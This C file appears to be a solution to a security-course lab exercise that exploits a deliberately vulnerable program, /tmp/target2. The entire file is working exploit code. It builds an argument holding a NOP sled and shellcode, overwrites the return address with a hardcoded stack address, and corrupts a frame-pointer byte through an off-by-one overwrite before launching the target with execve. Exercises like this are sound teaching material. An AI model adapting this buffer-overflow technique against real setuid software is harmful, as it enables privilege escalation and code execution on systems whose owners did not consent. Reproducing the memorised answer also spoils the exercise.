#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1];

  /****************************************
   *********** CODE BEGINS HERE ***********/

  int i = 0;
  args[1] = malloc(144);

  // fill entire argument with 'A's
  memset(args[1],'\x90',144);

  // fill first with shellcode
  memcpy (args[1], shellcode, strlen(shellcode));

  // eip
  *(long *)(args[1] + 138) = 0xbffffd4a;

  // overwrite altering byte
  args[1][142] = '\xD0';

  // null terminate
  args[1][143] = '\x00';

  /************ CODE ENDS HERE ************
   ****************************************/

  args[0] = TARGET;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
